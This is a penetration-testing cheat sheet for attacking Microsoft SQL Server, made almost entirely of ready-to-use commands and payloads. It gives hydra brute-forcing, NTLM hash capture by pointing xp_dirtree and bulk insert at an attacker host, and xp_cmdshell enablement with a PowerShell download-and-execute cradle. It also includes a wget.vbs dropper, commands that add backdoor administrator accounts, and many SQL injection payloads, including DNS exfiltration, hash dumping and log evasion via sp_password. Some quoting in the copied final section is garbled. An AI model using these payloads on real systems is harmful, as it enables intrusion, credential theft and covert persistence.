`` Scanning

    ~$ nmap VAR_TARGET_HOST -v -p 1433 -sV -Pn -vv --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-tables

`` Password Bruteforcing

    ~$ nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=VAR_WORDLIST VAR_TARGET_HOST
    ~$ hydra -L users.txt -vV -P VAR_WORDLIST VAR_TARGET_HOST mssql

`` TDS Versions

    - 7.0
        - SQL Server 7.0
    - 7.1
        - SQL Server 2000
    - 7.1 Revision 1
        - SQL Server 2000 SP1
    - 7.2
        - SQL Server 2005
    - 7.3.A
        - SQL Server 2008
    - 7.3.B
        - SQL Server 2008 R2
    - 7.4
        - SQL Server 2012
        - SQL Server 2014
        - SQL Server 2016
        - SQL Server 2017
        - SQL Server 2019

`` Remote console

    ~$ vim ~/.sqshrc
    ~$ sqsh -S mssql1

`` Capturing NTLM

    > EXEC master..xp_dirtree "\\VAR_ATTACKER_HOST\\test";

`` Change sa password

    ~> net stop MSSQL$SQLEXPRESS
    ~> net start MSSQL$SQLEXPRESS /m sqlcmd
    ~> sqlcmd
        > GO
        > ALTER LOGIN [sa] WITH DEFAULT_DATABASE=[master]
        > GO
        > USE [master]
        > GO
        > ALTER LOGIN [sa] WITH CHECK_POLICY = OFF;
        > GO
        > ALTER LOGIN [sa] WITH PASSWORD=N'sa';
        > GO
    ~> net stop MSSQL$SQLEXPRESS
    ~> net start MSSQL$SQLEXPRESS

`` Linked servers

    `` List
        
        > EXEC sp_linkedservers;

    `` Execute on linked server

        > SELECT version FROM OPENQUERY("VAR_TARGET_HOST", 'SELECT @@version AS version')

    `` Remote execution

        > EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT VAR_TARGET_HOST
        > EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT VAR_TARGET_HOST
        > EXEC ('xp_cmdshell ''whoami'';') AT VAR_TARGET_HOST

`` With metasploit

    > use auxiliary/admin/mssql/mssql_sql
    > set USERNAME VAR_USERNAME
    > set PASSWORD VAR_PASSWORD
    > set DOMAIN VAR_DOMAIN
    > set USE_WINDOWS_AUTHENT yes
    > set RHOSTS VAR_TARGET_HOST
    > set SQL "EXEC master..xp_dirtree '\\\\VAR_ATTACKER_HOST\\test'"
    > run

`` xp_cmdshell

    `` The basic approach

        > exec sp_configure "show advanced options", 1
        > reconfigure
        > exec sp_configure "xp_cmdshell", 1
        > reconfigure
        > xp_cmdshell "whoami"

    `` Download and execute PowerShell

        > xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://VAR_TARGET_HOST/script.ps1\");"

    `` wget.vbs

        xp_cmdshell 'echo strUrl = WScript.Arguments.Item(0) > wget.vbs'
        go
        xp_cmdshell 'echo StrFile = WScript.Arguments.Item(1) >> wget.vbs'
        go
        xp_cmdshell 'echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs'
        go
        xp_cmdshell 'echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs'
        go
        xp_cmdshell 'echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs'
        go
        xp_cmdshell 'echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs'
        go
        xp_cmdshell 'echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs'
        go
        xp_cmdshell 'echo Err.Clear >> wget.vbs'
        go
        xp_cmdshell 'echo Set http = Nothing >> wget.vbs'
        go
        xp_cmdshell 'echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs'
        go
        xp_cmdshell 'echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs'
        go
        xp_cmdshell 'echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs'
        go
        xp_cmdshell 'echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs'
        go
        xp_cmdshell 'echo http.Open "GET",strURL,False >> wget.vbs'
        go
        xp_cmdshell 'echo http.Send >> wget.vbs'
        go
        xp_cmdshell 'echo varByteArray = http.ResponseBody >> wget.vbs'
        go
        xp_cmdshell 'echo Set http = Nothing >> wget.vbs'
        go
        xp_cmdshell 'echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs'
        go
        xp_cmdshell 'echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs'
        go
        xp_cmdshell 'echo strData = "" >> wget.vbs'
        go
        xp_cmdshell 'echo strBuffer = "" >> wget.vbs'
        go
        xp_cmdshell 'echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs'
        go
        xp_cmdshell 'echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs'
        go
        xp_cmdshell 'echo Next >> wget.vbs'
        go
        xp_cmdshell 'echo ts.Close >> wget.vbs'
        go

    `` Using sqsh

        ~$ cat ~/.freetds.conf
        [mssql1]
                host = VAR_TARGET_HOST
                port = 27900
                tds version = 8.0
        ~$ sqsh -S mssql1 -U sa
        > exec sp_configure "show advanced options", 1
        > go
        > reconfigure
        > go
        > exec sp_configure "xp_cmdshell", 1
        > go
        > reconfigure
        > go
        > xp_cmdshell "whoami"
        > go
        > xp_cmdshell "net user VAR_USERNAME VAR_PASSWORD /add"
        > xp_cmdshell "net localgroup administrators VAR_USERNAME /add"

`` Structure

    - SELECT name FROM sysobjects WHERE xtype = 'U'
    - SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')

`` Hacks

    - DROP sampletable;--
    - DR/**/OP/*bypass blacklisting*/sampletable
    - SELECT * FROM members; DROP members--
    - IF (1=1) SELECT 'true' ELSE SELECT 'false'
    - if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0
    - SELECT CHAR(0x66)
    - SELECT login + '-' + password FROM members
    - SELECT CHAR(75)+CHAR(76)+CHAR(77)
    - SELECT ASCII('a')
    - SELECT CHAR(64)
    - SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members
    - '; INSERT INTO users VALUES( 1, 'VAR_USERNAME', 'VAR_PASSWORD', 9 )/*
    - INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

    `` Second Order SQL Injections

        Basically, you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.
        If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.

        Name: ' + (SELECT TOP 1 password FROM users ) + '

    `` Time-based blind

        if (select user) = 'sa' waitfor delay '0:0:10'

        ProductID = 1;waitfor delay '0:0:10'--
        ProductID = 1);waitfor delay '0:0:10'--
        ProductID = 1';waitfor delay '0:0:10'--
        ProductID = 1');waitfor delay '0:0:10'--
        ProductID = 1));waitfor delay '0:0:10'--
        ProductID = 1'));waitfor delay '0:0:10'--

    `` Finding column names with HAVING BY

        ' HAVING 1=1 --
        ' GROUP BY table.columnfromerror1 HAVING 1=1 --
        ' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
        ' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --

    `` Finding column type

        ' union select sum(columntofind) from users--

    `` Web application path (IIS 6 only)

        metabase file(%systemroot%\system32\inetsrv\MetaBase.xml)

    `` Filesystem

        CREATE TABLE foo( line varchar(8000) )
        BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'
        DROP foo

        -- Write to file
        bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

        -- xp_cmdshell (disabled in SQL Server 2005 by default)
        EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
        EXEC master.dbo.xp_cmdshell 'ping '

    `` Enabling stored procedures

        EXEC sp_configure 'show advanced options',1
        RECONFIGURE

        EXEC sp_configure 'xp_cmdshell',1
        RECONFIGURE

        exec sp_configure 'show advanced options', 1
        go
        reconfigure
        go
        exec sp_configure 'xp_cmdshell', 1
        go
        reconfigure
        go
        xp_cmdshell 'dir c:\'
        go

    `` Other stored procedures

        # Registry Stuff (xp_regread)
            xp_regaddmultistring
            xp_regdeletekey
            xp_regdeletevalue
            xp_regenumkeys
            xp_regenumvalues
            xp_regread
            xp_regremovemultistring
            xp_regwrite
            exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
            exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
        # Managing Services (xp_servicecontrol)
        # Medias (xp_availablemedia)
        # ODBC Resources (xp_enumdsn)
        # Login mode (xp_loginconfig)
        # Creating Cab Files (xp_makecab)
        # Domain Enumeration (xp_ntsec_enumdomains)
        # Process Killing (need PID) (xp_terminate_process)
        # Add new procedure (virtually you can execute whatever you want)
        sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'
        exec xp_webserver
        # Write text file to a UNC or an internal path (sp_makewebtask)

    `` Moving records

        Modify WHERE and use NOT IN or NOT EXIST,
        ... WHERE users NOT IN ('First User', 'Second User')
        SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) -- very good one
        Using Dirty Tricks
        SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int

        Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21

    `` Fast way to extract data from Error Based SQL Injections in SQL Server

        ';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--

    `` Covert

        SQL Server don't log queries that includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible)

    `` Forcing SQL Server to get NTLM Hashes

        This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.

        bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'

`` Out of Band Channel Attacks

    `` Makes DNS resolution request to {INJECT}.yourhost.com

        ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')

    `` Makes DNS resolution request to {INJECTION}.yourhost.com

        ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q

`` Extra

    [ Source: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet ]

    - Version     SELECT @@version
    - Comments    SELECT 1 — comment
    - SELECT /*comment*/1
    - Current User    SELECT user_name();
    - SELECT system_user;
    - SELECT user;
    - SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
    - List Users  SELECT name FROM master..syslogins
    - List Password Hashes    SELECT name, password FROM master..sysxlogins — priv, mssql 2000;
    - SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
    - SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;
    - SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005
    - Password Cracker   MSSQL 2000 and 2005 Hashes are both SHA1-based.  phrasen|drescher can crack these.
    - List Privileges     – current privs on a particular object in 2005, 2008
    - SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE'); — current database
    - SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); — current server
    - SELECT permission_name FROM master..fn_my_permissions('maste'..syslogins’, 'OBJECT'); –permissions on a table
    - SELECT permission_name FROM master..fn_my_permissions('sa', 'USER');

    –permissions on a user– current privs in 2005, 2008
    - SELECT is_srvrolemember('sysadmin');
    - SELECT is_srvrolemember('dbcreator');
    - SELECT is_srvrolemember('bulkadmin');
    - SELECT is_srvrolemember('diskadmin');
    - SELECT is_srvrolemember('processadmin');
    - SELECT is_srvrolemember('serveradmin');
    - SELECT is_srvrolemember('setupadmin');
    - SELECT is_srvrolemember('securityadmin');

    – who has a particular priv? 2005, 2008
    - SELECT name FROM master..syslogins WHERE denylogin = 0;
    - SELECT name FROM master..syslogins WHERE hasaccess = 1;
    - SELECT name FROM master..syslogins WHERE isntname = 0;
    - SELECT name FROM master..syslogins WHERE isntgroup = 0;
    - SELECT name FROM master..syslogins WHERE sysadmin = 1;
    - SELECT name FROM master..syslogins WHERE securityadmin = 1;
    - SELECT name FROM master..syslogins WHERE serveradmin = 1;
    - SELECT name FROM master..syslogins WHERE setupadmin = 1;
    - SELECT name FROM master..syslogins WHERE processadmin = 1;
    - SELECT name FROM master..syslogins WHERE diskadmin = 1;
    - SELECT name FROM master..syslogins WHERE dbcreator = 1;
    - SELECT name FROM master..syslogins WHERE bulkadmin = 1;
    - List DBA Accounts   SELECT is_srvrolemember('sysadmin'); — is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try 'bulkadmin', 'systemadmin' and other values from the documentation
    - SELECT is_srvrolemember('sysadmin', 'sa'); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
    - SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005
    - Current Database    SELECT DB_NAME()
    - List Databases  SELECT name FROM master..sysdatabases;
    - SELECT DB_NAME(N); — for N = 0, 1, 2, …
    - List Columns    SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); — for the current DB only
    - SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
    - List Tables     SELECT name FROM master..sysobjects WHERE xtype = 'U'; — use xtype = 'V' for views
    - SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
    - SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
    - Find Tables From Column Name    – NB: This example works only for the current database.  If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).
    - SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWOR'%’ — this lists table, column for each column containing the word 'password'
    - Select Nth Row  SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row
    - Select Nth Char     SELECT substring('abcd', 3, 1) — returns c
    - Bitwise AND     SELECT 6 & 2 — returns 2
    - SELECT 6 & 1 — returns 0
    - ASCII Value -> Char     SELECT char(0×41) — returns A
    - Char -> ASCII Value     SELECT ascii('A') – returns 65
    - Casting     SELECT CAST(’1′ as int);
    - SELECT CAST(1 as char)
    - String Concatenation    SELECT 'A' + 'B' – returns AB
    - If Statement    IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1
    - Case Statement  SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1
    - Avoiding Quotes     SELECT char(65)+char(66) — returns AB
    - Time Delay   WAITFOR DELAY ’0:0:5′ — pause for 5 seconds
    - Make DNS Requests   declare @host varchar(800); select @host = name FROM master..syslogins; exec('maste'..xp_getfiledetails ”\’ + @host + ''$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.'.pentestmonkey.net’ from sys.sql_logins; exec('xp_fileexis' ”\’ + @host + ''$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
    - – Also check out theDNS tunnel feature of sqlninja
    - Command Execution   EXEC xp_cmdshell 'ne' user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
    - EXEC sp_configure 'sho' advanced options’, 1; — priv
    - RECONFIGURE; — priv
    - EXEC sp_configure 'xp_cmdshell', 1; — priv
    - RECONFIGURE; — priv
    - Local File Access   CREATE TABLE mydata (line varchar(8000));
    - BULK INSERT mydata FROM '':boot.ini’;
    - DROP TABLE mydata;
    - Hostname, IP Address    SELECT HOST_NAME()
    - Create Users    EXEC sp_addlogin 'user', 'pass'; — priv
    - Drop Users  EXEC sp_droplogin 'user'; — priv
    - Make User DBA   EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmi'; — priv
    - Location of DB files    EXEC sp_helpdb master; –location of master.mdf
    - EXEC sp_helpdb pubs; –location of pubs.mdf
    - Default/System Databases    northwind
    - model
    - msdb
    - pubs — not on sql server 2005
    - tempdb
    - Misc Tips

    In no particular order, here are some suggestions from pentestmonkey readers.

    From Dan Crowley:
    A way to extract data via SQLi with a MySQL backend

    From Jeremy Bae:
    Tip about sp_helpdb – included in table above.

    From Trip:
    List DBAs (included in table above now):

        select name from master..syslogins where sysadmin = ’1′

    From Daniele Costa:
    Tips on using fn_my_permissions in 2005, 2008 – included in table above.
    Also:
    To check permissions on multiple database you will have to use the following pattern.

        USE [DBNAME]; select permission_name FROM fn_my_permissions (NULL, 'DATABASE')

    Note also that in case of using this data with a UNION query a collation error could occur.
    In this case a simple trick is to use the following syntax:

        select permission_name collate database_default FROM fn_my_permissions (NULL, 'DATABASE')

